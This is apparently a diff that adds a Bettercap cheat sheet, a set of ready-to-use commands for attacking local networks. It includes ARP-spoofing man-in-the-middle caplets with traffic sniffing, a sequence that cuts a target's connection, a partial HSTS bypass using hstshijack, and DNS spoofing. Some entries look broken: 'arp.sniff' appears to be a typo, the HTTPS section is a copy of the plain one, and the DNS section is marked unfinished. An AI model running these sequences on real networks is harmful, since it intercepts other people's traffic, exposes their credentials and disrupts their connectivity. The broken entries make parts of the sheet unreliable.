@@ -1,0 +1,80 @@
+# Bettercap
+
+## Cool applications can be found here:
+## https://www.cyberpunk.rs/bettercap-usage-examples-overview-custom-setup-caplets
+## The "events.stream" module is (or must be) always enabled
+
+## We can automate stuff by using caplets, which are bettercap scripts
+## Example of caplet for ARP Spoffing MiTM:
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.5
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+
+
+# Launch bettercap console
+bettercap -iface $interface
+
+# Launch a betteercap script (caplet)
+bettercap -iface $interface -caplet $pathtospoofscript.cap
+
+# Show available caplets
+caplets.show
+
+# Get a list of available modules
+help
+
+# Get a list of running (active) modules
+active
+
+# Show help for a module (e.g., net.recon)
+help net.recon
+
+# Activate the module called "net.probe" which probes new hosts on the network by sending UDP packets
+net.probe on
+
+# Show discovered targets
+net.show
+
+# Plain ARP Spoofing (doesn't work with encypted traffic)
+help arp.spoof                    ;; view available options
+net.probe on
+set arp.spoof.fullduplex true     ;; poisons bidirectionally
+set arp.spoof.targets $IPaddress
+arp.spoof on
+set net.sniff.local true
+arp.sniff on
+
+# Cut connection on the target with ARP Spoofing
+set arp.spoof.targets $IPaddress
+arp.ban on
+
+# Basic HTTPS ARP Spoofing
+help arp.spoof                    ;; view available options
+net.probe on
+set arp.spoof.fullduplex true     ;; poisons bidirectionally
+set arp.spoof.targets $IPaddress
+arp.spoof on
+set net.sniff.local true
+arp.sniff on
+
+# HSTS HTTPS Partial Bypass ARP Spoofing
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.5
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+hstshijack/hstshijack             ;; run the hstshijack caplet
+
+# DNS Spoofing (Does not bypass HSTS) --- FIX THIS 
+systemctl start apache2 (or use docker)
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.1.5
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+dns.spoof on
